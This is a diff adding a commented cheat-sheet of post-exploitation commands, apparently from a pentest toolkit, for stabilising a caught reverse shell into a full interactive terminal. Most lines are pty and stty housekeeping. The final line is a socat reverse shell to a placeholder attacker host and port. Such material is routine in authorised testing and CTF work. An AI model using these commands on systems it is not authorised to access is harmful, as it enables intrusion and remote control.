@@ -1,0 +1,26 @@
+# Turning a dumb shell into a usable one. `listen` (penelope) does this for you;
+# these are for when you caught the shell some other way.
+
+# on target · python pty
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+# on target · no python, use script
+script -qc /bin/bash /dev/null
+
+# on target · no python, no script
+/bin/sh -i
+
+# locally · after Ctrl-Z, hand the terminal over (then `fg`)
+stty raw -echo; fg
+
+# on target · size the terminal and set TERM (read rows/cols from `stty size` locally)
+export TERM=xterm-256color; stty rows 50 cols 200
+
+# locally · find your real terminal size to use above
+stty size
+
+# on target · fix a shell with no job control
+export SHELL=/bin/bash; export TERM=xterm-256color
+
+# on target · socat full pty (listener: socat file:`tty`,raw,echo=0 tcp-listen:{{PORT}})
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{{LHOST}}:{{PORT}}
